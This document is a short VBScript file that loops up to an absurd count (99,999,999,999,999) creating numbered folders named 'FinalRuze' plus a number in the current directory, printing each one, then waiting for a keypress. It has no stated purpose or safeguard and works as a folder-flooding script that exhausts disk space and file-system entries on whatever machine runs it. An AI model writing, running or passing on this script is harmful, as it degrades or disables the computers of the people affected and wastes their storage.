Const num_folders = 99999999999999
Dim base_folder_name, folder_name, i

' Set the base folder name
base_folder_name = "FinalRuze"

' Loop to create the folders
For i = 1 To num_folders
    ' Generate the folder name with a number at the end
    folder_name = base_folder_name & i
    ' Create the folder
    CreateObject("Scripting.FileSystemObject").CreateFolder folder_name
    WScript.Echo "Created folder: " & folder_name
Next

WScript.Echo "Press any key to continue..."
WScript.StdIn.Read(1)
